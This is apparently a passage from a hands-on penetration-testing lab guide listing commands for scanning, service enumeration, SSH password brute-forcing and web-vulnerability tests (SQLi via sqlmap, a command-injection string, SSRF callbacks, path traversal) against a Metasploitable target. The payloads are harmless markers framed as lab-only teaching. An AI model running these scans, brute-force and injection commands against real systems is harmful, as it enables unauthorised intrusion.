title: I-2. VM snapshots and reset
text: Keep the lab repeatable. - `VBoxManage snapshot "Kali" take pre-test` — Takes a VirtualBox snapshot if VBox is used. - `VBoxManage snapshot "MS2" take clean-target` — Takes a clean Metasploitable snapshot. - `VBoxManage snapshot "MS2" restore clean-target` — Resets the target after each lesson.

title: I-3. Files and permissions
text: Learn the system you are attacking/defending. - `pwd && ls -la` — Shows current directory and hidden files. - `stat file.txt` — Displays ownership, permissions, and timestamps. - `find / -perm -4000 -type f 2>/dev/null | head` — Finds SUID binaries for privilege-escalation review.

title: I-4. Processes, users, and services
text: Map what is running and who owns it. - `ps aux | head -n 30` — Shows running processes. - `ss -tulpn` — Shows listening ports and owning processes. - `systemctl list-units --type=service --state=running` — Lists active services.

title: I-5. Log review
text: Understand what defenders see. - `sudo tail -f /var/log/auth.log` — Watches authentication events live. - `journalctl -xe` — Shows recent system errors and service logs. - `sudo tail -f /var/log/apache2/access.log` — Watches web requests during a test.

title: I-6. IP, routes, and ports
text: Understand how traffic reaches the target. - `ip a ip route` — Shows interfaces and routing. - `ss -tuln` — Lists local listening TCP/UDP ports. - `nc -nv $TARGET 80` — Tests a raw TCP connection to a port.

title: I-7. Packet capture
text: See what tools actually send. - `sudo tcpdump -i eth0 host $TARGET -w lab.pcap` — Captures only lab-target traffic. - `sudo tcpdump -i eth0 port 80 -A` — Shows readable HTTP payload traffic. - `wireshark lab.pcap` — Opens the capture for analysis.

title: I-8. Passive domain and username OSINT
text: Collect public data without touching the target. - `subfinder -d $OWN_DOMAIN -silent` — Finds subdomains passively. - `theHarvester -d $OWN_DOMAIN -b all` — Collects emails/hosts from public sources. - `sherlock testuser` — Checks where a username appears publicly.

title: I-9. Metadata and document OSINT
text: Inspect public files for leaks. - `wget -O report.pdf http://$OWN_DOMAIN/report.pdf` — Downloads an owned/public test document. - `exiftool report.pdf` — Extracts document metadata. - `strings report.pdf | head` — Shows embedded text and paths.

title: I-10. Technology fingerprinting
text: Identify stack before choosing attacks. - `curl -I http://$TARGET` — Reads HTTP headers. - `whatweb http://$TARGET` — Fingerprints web technologies. - `nmap -sV -p80,443 $TARGET` — Fingerprints HTTP service versions.

title: I-11. Nmap full assessment
text: Build a complete service map. - `sudo nmap -sS -sV -sC -O -p- -oA full $TARGET` — Full TCP scan with version/scripts/OS detection. - `sudo nmap -sU --top-ports 100 -sV -oA udp $TARGET` — Top UDP service scan. - `grep "open" full.nmap` — Lists open services from the report.

title: I-12. Fast port discovery
text: Use speed tools carefully in a lab. - `rustscan -a $TARGET -- -sV` — Fast port discovery plus Nmap fingerprinting. - `sudo masscan -p1-65535 $TARGET --rate=1000` — Very fast lab-only TCP port scan. - `naabu -host $TARGET` — Lightweight port discovery.

title: I-13. FTP service checks
text: Check FTP version and anonymous access. - `nc -nv $TARGET 21` — Reads FTP banner. - `ftp $TARGET` — Opens interactive FTP login. - `nmap -p21 --script ftp-anon,ftp-syst $TARGET` — Checks anonymous access and system info.

title: I-14. SSH service checks
text: Audit SSH config and lab credentials. - `ssh-audit $TARGET` — Reviews SSH algorithms and configuration. - `ssh msfadmin@$TARGET` — Manual lab login test. - `hydra -L users.txt -P passwords.txt -t 4 -f ssh://$TARGET` — Lab-only password audit.

title: I-15. SMB enumeration
text: Map shares and Windows users. - `smbclient -L //$TARGET -N` — Lists shares anonymously. - `smbmap -H $TARGET` — Shows share permissions. - `enum4linux-ng -A $TARGET` — Collects SMB users, groups, and policy.

title: I-16. RDP and remote access
text: Check Windows remote access exposure. - `nmap -p3389 --script rdp-enum-encryption,rdp-ntlm-info $TARGET` — Fingerprints RDP security. - `xfreerdp /v:$TARGET /u:test /p:labpass` — Manual lab RDP login test. - `nmap -p3389 --script rdp-vuln-ms12-020 $TARGET` — Checks a known RDP vulnerability where applicable.

title: I-17. DNS enumeration
text: Collect records and test transfers. - `dig @$TARGET version.bind CHAOS TXT` — Checks DNS version disclosure. - `dig @$TARGET example.com AXFR` — Tests zone transfer on your own zone. - `dnsrecon -d example.com -n $TARGET` — Runs broader DNS checks.

title: I-18. SMTP and SNMP
text: Check legacy service information leakage. - `nc -nv $TARGET 25` — Reads SMTP banner. - `smtp-user-enum -M VRFY -U users.txt -t $TARGET` — Tests SMTP user enumeration in lab. - `snmpwalk -v2c -c public $TARGET` — Tests public SNMP community string on lab targets.

title: I-19. NFS and RPC
text: Find exported filesystems. - `rpcinfo -p $TARGET` — Lists registered RPC services. - `showmount -e $TARGET` — Shows exported NFS directories. - `sudo mount -o ro -t nfs $TARGET:/ /mnt/target` — Mounts a lab export read-only.

title: I-20. Proxy, crawling, and site map
text: Map the app before testing payloads. - `zaproxy -daemon -port 8090` — Starts OWASP ZAP proxy if installed. - `katana -u http://$TARGET -o urls.txt` — Crawls the target app. - `httpx -l urls.txt -status-code -title` — Fingerprints discovered URLs.

title: I-21. Content and parameter discovery
text: Find hidden routes and inputs. - `ffuf -u http://$TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt` — Discovers files and directories. - `feroxbuster -u http://$TARGET` — Recursive route discovery. - `arjun -u http://$TARGET/api/endpoint` — Discovers hidden parameters.

title: I-22. Authentication and session review
text: Audit login/session controls. - `curl -i http://$TARGET/login` — Shows login response headers and cookies. - `jwt_tool <paste-token>` — Inspects JWT structure and common issues. - `curl -I http://$TARGET/logout` — Checks whether logout invalidates session.

title: I-23. IDOR and BOLA
text: Test object-level authorization. - `curl -H "Cookie: session=<A>" http://$TARGET/profile/1` — Baseline request as user A. - `curl -H "Cookie: session=<B>" http://$TARGET/profile/1` — Same object request as user B. - `curl -H "Cookie: session=<B>" http://$TARGET/profile/2` — User B private object for comparison.

title: I-24. SQL injection
text: Prove database input manipulation safely. - `sqlmap -u "http://$TARGET/item.php?id=1" --batch --banner` — Tests a lab parameter for SQLi. - `sqlmap -u "http://$TARGET/item.php?id=1" --batch --current-db` — Shows current DB as safe proof. - `sqlmap -r request.txt --batch --level=2` — Tests a saved Burp request.

title: I-25. NoSQL injection
text: Test JSON/document query manipulation. - `curl -X POST http://$TARGET/login -H "Content-Type: application/json" -d @payload.json` — Sends a controlled JSON type-change test. - `cat payload.json` — Shows the lab JSON fixture. - `tail -f app.log` — Watches app errors during testing.

title: I-26. Command injection
text: Check whether input reaches a system command. - `curl "http://$TARGET/ping?host=127.0.0.1;id"` — Uses harmless id proof in a lab endpoint. - `curl "http://$TARGET/ping?host=127.0.0.1%3Bid"` — Encoded variant of the same harmless proof. - `tail -f /var/log/app.log` — Observes command execution evidence.

title: I-27. Cross-site scripting
text: Prove browser execution context. - `curl "http://$TARGET/search?q=LAB_XSS"` — Checks reflected marker context. - `dalfox url "http://$TARGET/search?q=test"` — Automates XSS parameter analysis in lab. - `curl -I http://$TARGET` — Checks CSP and security headers.

title: I-28. CSRF, CORS, and clickjacking
text: Audit browser trust boundaries. - `curl -I http://$TARGET/settings` — Checks SameSite, frame, and security headers. - `curl -H "Origin: https://lab.local" -I http://$TARGET/api` — Checks CORS response behavior. - `curl -X OPTIONS -H "Origin: https://lab.local" -I http://$TARGET/api` — Checks preflight behavior.

title: I-29. SSRF
text: Test server-side URL fetching. - `nc -lvnp 8000` — Starts a local callback listener. - `curl "http://$TARGET/fetch?url=http://$KALI:8000/callback"` — Tests whether the server calls your lab listener. - `curl "http://$TARGET/fetch?url=http://127.0.0.1:8000/health"` — Tests localhost reachability in lab.

title: I-30. SSTI and XXE
text: Test template and XML parser handling. - `curl "http://$TARGET/hello?name={{7*7}}"` — Safe template marker proof. - `cat > test.xml <<EOF <?xml version="1.0"?><x>LAB</x> EOF curl -X POST http://$TARGET/xml -d @test.xml` — Sends a safe XML parser fixture. - `tail -f app.log` — Observes template/parser errors.

title: I-31. File upload and path traversal
text: Test file controls safely. - `echo "LAB_MARKER" > marker.txt curl -F "file=@marker.txt" http://$TARGET/upload` — Uploads a harmless marker. - `curl http://$TARGET/files/marker.txt` — Checks whether upload is public. - `curl "http://$TARGET/read?name=/etc/hostname"` — Uses harmless hostname file for traversal proof.

title: I-32. Deserialization and secrets exposure
text: Find unsafe object and leaked credential paths. - `base64 -d object.b64 | xxd | head` — Inspects a serialized blob safely. - `curl -I http://$TARGET/.git/HEAD` — Checks repository exposure. - `gitleaks detect --source .` — Scans a repo for secrets.

title: I-33. GraphQL and WebSocket
